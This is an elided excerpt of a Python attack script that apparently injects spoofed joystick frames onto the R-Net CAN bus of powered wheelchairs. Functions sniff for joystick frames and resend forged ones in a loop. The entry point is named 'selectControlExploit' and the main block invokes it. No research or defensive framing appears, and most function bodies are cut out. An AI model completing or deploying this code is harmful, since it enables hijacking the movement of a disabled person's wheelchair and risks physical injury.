...
def inject_rnet_joystick_frame(can_socket, rnet_joystick_id):
    ...
    while rnet_threads_running:
        ...
        if cf == rnet_joystick_frame_raw:
            cansend(can_socket, rnet_joystick_id + '#' +
...
def wait_rnet_joystick_frame(can_socket, start_time):
    ...
    while frameid[0:3] != '020':
        # this is a blocking read.... so if there is no canbus traffic it will sit forever (to fix!)
        cf, addr = can_socket.recvfrom(16)
...
def watch_and_wait():
    ...
    while threading.active_count() > 0 and rnet_threads_running:
        sleep(0.5)
        print(str(round(time()-started_time, 2))+'\tX: '+dec2hex(joystick_x, 2) +
              '\tY: '+dec2hex(joystick_y, 2) + '\tThreads: '+str(threading.active_count()))
...
def selectControlExploit(can_socket, user_selection):
    ...
    if (user_selection == 1):
        ...
        rnet_joystick_id = wait_rnet_joystick_frame(
            can_socket, start_time)  # t=timeout time
...
if __name__ == "__main__":
    ...
    if True:
        ...
        selectControlExploit(can_socket, 2)
